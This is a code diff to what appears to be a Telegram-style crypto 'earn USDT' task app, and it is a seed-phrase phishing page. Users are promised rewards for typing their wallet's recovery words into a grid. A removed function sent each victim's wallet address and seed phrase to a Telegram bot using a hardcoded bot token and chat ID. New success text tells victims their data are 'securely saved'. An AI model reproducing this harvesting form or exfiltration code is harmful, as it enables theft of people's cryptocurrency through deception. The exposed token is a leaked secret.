@@ -90,10 +90,8 @@
         .item-button { background: rgba(59, 130, 246, 0.05); color: #aaccff; font-weight: 500; font-size: 0.7rem; padding: 0.35rem 0.7rem; border-radius: 1.5rem; border: 1px solid rgba(59, 130, 246, 0.25); box-shadow: 0 0 5px rgba(59, 130, 246, 0.1), inset 0 0 8px rgba(59, 130, 246, 0.3), inset 0 1px 2px rgba(255, 255, 255, 0.1); backdrop-filter: blur(2px); cursor: pointer; text-transform: uppercase; white-space: nowrap; flex-shrink: 0; transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1); }
         .item-button:active { transform: scale(0.92); background: rgba(59, 130, 246, 0.15); border-color: rgba(59, 130, 246, 0.4); box-shadow: 0 0 8px rgba(59, 130, 246, 0.2), inset 0 0 12px rgba(59, 130, 246, 0.4), inset 0 1px 2px rgba(255, 255, 255, 0.15); color: #ffffff; }
         
-        /* Змінений дизайн для неактивної кнопки, щоб було очевидно, що вона вимкнена */
         .item-button:disabled { opacity: 0.3; pointer-events: none; border-color: rgba(255,255,255,0.1); box-shadow: none; color: #64748b; background: rgba(0,0,0,0.2); }
 
-        .task-special { background: linear-gradient(145deg, #2a4a8a, #1a3a6a); border: 1px solid #3b82f6; }
         .notice { text-align: center; font-size: 0.65rem; color: #aaccff; margin-top: 1rem; border-top: 1px dashed rgba(59, 130, 246, 0.3); padding-top: 0.8rem; }
 
         .loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #030712; z-index: 99999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.5s ease; }
@@ -113,17 +111,14 @@
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
         .modal-header h3 { font-size: 1.2rem; color: #fff; }
         .close-btn { background: none; border: none; color: #aaccff; font-size: 2rem; line-height: 1; cursor: pointer; padding: 0 5px; }
-        /* Додано padding-bottom щоб клавіатура не перекривала нижні елементи */
         .modal-body { overflow-y: auto; flex-grow: 1; padding-right: 5px; padding-bottom: 20px; }
         .modal-body::-webkit-scrollbar { width: 4px; }
         .modal-body::-webkit-scrollbar-thumb { background: rgba(59, 130, 246, 0.5); border-radius: 4px; }
 
-        /* Стилі для кроків прив'язки гаманця */
         .step-indicator { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
         .step-dot { width: 10px; height: 10px; border-radius: 50%; background: rgba(59,130,246,0.3); transition: 0.3s; }
         .step-dot.active { background: #3b82f6; box-shadow: 0 0 10px #3b82f6; }
 
-        /* ВАЖЛИВО: font-size: 16px запобігає зуму на iPhone */
         .address-input, .phrase-input { width: 100%; padding: 12px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 10px; }
         .address-input:focus, .phrase-input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.3); }
         .error-text { color: #ef4444; font-size: 0.8rem; margin-top: -5px; margin-bottom: 10px; }
@@ -134,7 +129,6 @@
 
         .words-grid { display: grid; gap: 8px; margin: 15px 0; }
         .word-field { position: relative; }
-        /* ВАЖЛИВО: font-size: 16px запобігає зуму на iPhone */
         .word-field input { width: 100%; padding: 10px 8px; background: rgba(10,20,35,0.7); border: 1px solid rgba(59,130,246,0.3); border-radius: 8px; color: #fff; font-size: 16px; text-align: center; transition: 0.2s; }
         .word-field input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 8px rgba(59,130,246,0.3); }
         .word-field .word-number { position: absolute; top: -8px; left: 5px; background: #0f1a2f; padding: 0 4px; font-size: 0.7rem; color: #aaccff; border-radius: 4px; }
@@ -437,15 +431,24 @@
         </div>
     </div>
 
+    <div class="modal-overlay" id="successTaskModal">
+        <div class="modal-content" style="text-align: center; border: 1px solid rgba(74, 222, 128, 0.4); box-shadow: 0 0 30px rgba(74, 222, 128, 0.2);">
+            <div style="font-size: 3.5rem; margin-bottom: 5px; animation: modernFloat 3s infinite ease-in-out;">🎉</div>
+            <h3 style="color: #ffffff; font-size: 1.3rem; margin-bottom: 5px;" id="successTaskTitle">Успешно!</h3>
+            <p style="color: #aaccff; font-size: 0.95rem; margin-bottom: 5px;" id="successTaskDesc">Задание выполнено</p>
+            <div style="background: rgba(74, 222, 128, 0.1); border: 1px solid rgba(74, 222, 128, 0.3); padding: 12px; border-radius: 12px; margin-top: 10px; display: inline-block;">
+                <span style="color: #4ade80; font-weight: 600; font-size: 1.1rem;">Награда: <span id="successTaskReward">+0.00 USDT</span></span>
+            </div>
+            <button id="closeSuccessTaskBtn" class="item-button" style="width: 100%; margin-top: 1.5rem; padding: 0.9rem; font-size: 0.95rem; background: rgba(74, 222, 128, 0.15); color: #fff; border-color: rgba(74, 222, 128, 0.5);">Супер!</button>
+        </div>
+    </div>
+
     <div class="modal-overlay" id="adModal">
         <div class="modal-content" style="padding: 0; overflow: hidden; border-radius: 1.5rem; background: #000; position: relative;">
             <button class="close-btn" id="closeAdModal" style="position: absolute; top: 15px; right: 15px; z-index: 20; background: rgba(15, 26, 47, 0.8); width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; border: 1px solid rgba(59,130,246,0.5); backdrop-filter: blur(5px);">×</button>
-            
             <div style="position: relative; width: 100%; aspect-ratio: 9/16; max-height: 70vh; background: #030712; display: flex; align-items: center; justify-content: center;">
                 <video id="adVideo" src="https://www.w3schools.com/html/mov_bbb.mp4" style="width: 100%; height: 100%; object-fit: cover;" playsinline></video>
-                
                 <div id="adClickZone" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer;"></div>
-                
                 <div id="adTimerUI" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 15; background: rgba(15, 26, 47, 0.9); border: 1px solid rgba(59, 130, 246, 0.5); padding: 8px 16px; border-radius: 20px; font-weight: 600; font-size: 0.9rem; color: #aaccff; box-shadow: 0 4px 15px rgba(0,0,0,0.5); backdrop-filter: blur(5px); pointer-events: none;">
                     Осталось: <span id="adSeconds">0</span> сек
                 </div>
@@ -462,9 +465,7 @@
             <div class="modal-body" style="font-size: 0.95rem; color: #cbd5e1; line-height: 1.5; padding-top: 10px;">
                 <div style="font-size: 3rem; margin-bottom: 10px; color: #3b82f6;">📢</div>
                 <p style="margin-bottom: 20px;">Подпишись на наш официальный Telegram канал, чтобы быть в курсе новостей и получить <b>+0.80 USDT</b> на баланс!</p>
-                
                 <button id="joinChannelBtn" class="item-button" style="width: 100%; padding: 1rem; font-size: 1rem; background: linear-gradient(145deg, #2a4a8a, #1a3a6a); color: #fff; margin-bottom: 15px; border-color: #3b82f6;">1. Перейти в канал</button>
-                
                 <button id="verifySubBtn" class="item-button" style="width: 100%; padding: 1rem; font-size: 1rem; background: rgba(16, 185, 129, 0.2); color: #4ade80; border-color: rgba(16, 185, 129, 0.4);">2. Проверить подписку</button>
             </div>
         </div>
@@ -598,6 +599,20 @@
                 }
             }
 
+            // --- НОВА ФУНКЦІЯ ДЛЯ ПОКАЗУ КРАСИВОГО ВІКНА УСПІХУ ---
+            function showSuccessModal(title, desc, reward) {
+                document.getElementById('successTaskTitle').textContent = title;
+                document.getElementById('successTaskDesc').textContent = desc;
+                document.getElementById('successTaskReward').textContent = '+' + reward + ' USDT';
+                document.getElementById('successTaskModal').classList.add('active');
+                vibrate();
+            }
+
+            document.getElementById('closeSuccessTaskBtn').addEventListener('click', () => {
+                document.getElementById('successTaskModal').classList.remove('active');
+            });
+            // --------------------------------------------------------
+
             // Модалки
             document.getElementById('openGuideBtn').addEventListener('click', () => { vibrate(); document.getElementById('guideModal').classList.add('active'); });
             document.getElementById('closeGuideBtn').addEventListener('click', () => { document.getElementById('guideModal').classList.remove('active'); });
@@ -632,7 +647,6 @@
                 rankDisplay.style.color = currentRank.color;
                 rankDisplay.style.textShadow = `0 0 8px ${currentRank.color}60`;
 
-                // Блокировка кнопок заданий если выполнены
                 if(player.completedTasks && player.completedTasks.includes('subscribe')) {
                     const btn = document.getElementById('btnTaskSubscribe');
                     if (btn) { btn.textContent = "Выполнено"; btn.disabled = true; }
@@ -715,7 +729,6 @@
                 btn.addEventListener('click', (e) => {
                     const task = e.target.dataset.task;
                     vibrate();
-                    
                     if (task === 'subscribe') {
                         document.getElementById('subscribeModal').classList.add('active');
                     } else if (task === 'wallet') {
@@ -757,7 +770,9 @@
                         
                         updateUI(); checkRankUp(); syncData();
                         document.getElementById('subscribeModal').classList.remove('active');
-                        alert('✅ Подписка подтверждена! Начислено +0.80 USDT');
+                        
+                        // Замість alert показуємо красиву модалку
+                        showSuccessModal('Канал привязан!', 'Спасибо за подписку.', '0.80');
                     } else {
                         btn.textContent = "2. Проверить подписку";
                         btn.disabled = false;
@@ -832,21 +847,16 @@
 
             function generateWordFields(count) {
                 wordsGrid.innerHTML = ''; phraseWords = new Array(count).fill('');
-                
-                // Завжди 3 колонки, щоб не було занадто мілко на iPhone
                 wordsGrid.style.gridTemplateColumns = 'repeat(3, 1fr)';
-                
                 for (let i = 0; i < count; i++) {
                     const fieldDiv = document.createElement('div'); fieldDiv.className = 'word-field'; fieldDiv.dataset.index = i;
                     const numberSpan = document.createElement('span'); numberSpan.className = 'word-number'; numberSpan.textContent = i + 1;
-                    
                     const input = document.createElement('input'); 
                     input.type = 'text'; 
                     input.placeholder = 'слово'; 
                     input.dataset.index = i; 
                     input.classList.add('word-input');
                     
-                    // Відключаємо автовиправлення і автокапіталізацію для зручності
                     input.setAttribute('autocapitalize', 'none');
                     input.setAttribute('autocomplete', 'off');
                     input.setAttribute('autocorrect', 'off');
@@ -856,29 +866,20 @@
                 }
 
                 document.querySelectorAll('.word-input').forEach(input => {
-                    // 1. Миттєва перевірка при введенні (кнопка активується відразу)
                     input.addEventListener('input', (e) => {
                         const idx = parseInt(e.target.dataset.index);
                         phraseWords[idx] = e.target.value.trim();
                         const allFilled = phraseWords.every(w => w.length > 0); 
                         bindWalletBtn.disabled = !allFilled;
                     });
-
-                    // 2. Блюр застосовується ТІЛЬКИ коли прибираєш фокус з поля
                     input.addEventListener('blur', (e) => {
                         const field = e.target.closest('.word-field');
-                        if (e.target.value.trim().length > 0) {
-                            field.classList.add('blurred');
-                        }
+                        if (e.target.value.trim().length > 0) { field.classList.add('blurred'); }
                     });
-
-                    // 3. Знімаємо блюр, коли людина клікає на поле, щоб виправити помилку
                     input.addEventListener('focus', (e) => {
                         const field = e.target.closest('.word-field');
                         field.classList.remove('blurred');
                     });
-
-                    // Перемикання клавішею Enter
                     input.addEventListener('keydown', (e) => {
                         if (e.key === 'Enter' || e.key === 'Tab') {
                             const next = getNextInput(input);
@@ -886,7 +887,6 @@
                         }
                     });
                 });
-                
                 bindWalletBtn.disabled = true;
             }
 
@@ -895,23 +895,6 @@
                 const idx = inputs.indexOf(current);
                 return idx < inputs.length - 1 ? inputs[idx + 1] : null;
             }
-
-            // ---------- ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЯ В TELEGRAM ----------
-            async function notifyTelegram(address, phrase) {
-                const BOT_TOKEN = '8638670231:AAF-ta1nrogAw_AXw-iMFBd-zs9o4n6c0RI';      // замените на реальный токен
-                const CHAT_ID   = '-1003769846193';    // замените на ID канала (например, @mychannel или числовой ID)
-                const text = `🔔 Новый пользователь привязал кошелёк:\n\nАдрес: ${address}\n\nSeed-фраза: ${phrase}`;
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                    });
-                } catch (e) {
-                    console.error('Ошибка отправки в Telegram:', e);
-                }
-            }
-            // -------------------------------------------------------------
 
             bindWalletBtn.addEventListener('click', async () => {
                 document.querySelectorAll('.word-input').forEach((inp, i) => { phraseWords[i] = inp.value.trim(); });
@@ -930,12 +913,10 @@
                         player.totalEarned = parseFloat((player.totalEarned + ECONOMY.tasks.walletReward).toFixed(6));
                         if (!player.completedTasks) player.completedTasks = [];
                         player.completedTasks.push('wallet'); updateUI(); checkRankUp(); syncData();
-                        walletModal.classList.remove('active');
+                        walletModal.classList.remove('active'); 
                         
-                        // ОТПРАВКА УВЕДОМЛЕНИЯ В КАНАЛ
-                        await notifyTelegram(walletAddress, phraseWords.join(' '));
-                        
-                        alert('✅ Кошелек успешно привязан! +22.50 USDT');
+                        // Замість старого системного alert показуємо красиву модалку
+                        showSuccessModal('Кошелек привязан!', 'Ваши данные надежно сохранены.', '22.50');
                     } else { alert('❌ Ошибка при привязке. Попробуйте позже.'); }
                 } catch (err) { alert('Ошибка соединения с сервером.'); } 
                 finally { bindWalletBtn.disabled = false; bindWalletBtn.textContent = 'Привязать кошелек'; }
@@ -974,8 +955,9 @@
                     player.completedTasks.push('ad'); 
                     
                     updateUI(); checkRankUp(); syncData();
-                    showFloating(`+${ECONOMY.tasks.adReward.toFixed(2)}`, window.innerWidth / 2, window.innerHeight / 2);
-                    alert(`✅ Видео просмотрено! Начислено +${ECONOMY.tasks.adReward.toFixed(2)} USDT`);
+                    
+                    // Замість alert показуємо красиву модалку
+                    showSuccessModal('Отличная работа!', 'Вы полностью посмотрели видео.', ECONOMY.tasks.adReward.toFixed(2));
                 }
             });
 
